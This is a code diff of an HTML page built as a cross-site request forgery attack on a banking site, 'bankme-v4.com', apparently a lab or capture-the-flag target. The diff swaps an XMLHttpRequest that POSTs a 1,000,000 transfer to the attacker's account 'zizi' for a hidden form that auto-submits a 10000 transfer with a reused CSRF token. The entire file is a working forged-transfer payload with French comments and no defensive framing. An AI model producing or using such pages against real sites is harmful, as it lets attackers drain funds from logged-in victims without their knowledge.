@@ -1,20 +1,15 @@
 <!DOCTYPE html>
 <html>
-  <body>
+<body>
+    <form id="csrf-form" action="https://bankme-v4.com/transfer/" method="POST">
+        <input type="hidden" name="recipient" value="zizi">
+        <input type="hidden" name="amount" value="10000">
+        <input type="hidden" name="token" value="6757059b4f9a22da000000">
+    </form>
+
     <script>
-      // Créer une requête POST vers l'endpoint /transfer/
-      var xhr = new XMLHttpRequest();
-      xhr.open("POST", "https://bankme-v4.com/transfer/", true);
-      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-      // Définir les paramètres du transfert
-      var recipient = "zizi"; // Votre compte
-      var amount = 1000000; // Le montant maximum
-      var token = "6757059b4f9a22da000000";
-      // Le token CSRF visible dans le formulaire
-
-      // Envoyer la requête
-      xhr.send(`recipient=${recipient}&amount=${amount}&token=${token}`);
+        // Soumettre le formulaire automatiquement
+        document.getElementById('csrf-form').submit();
     </script>
-  </body>
+</body>
 </html>
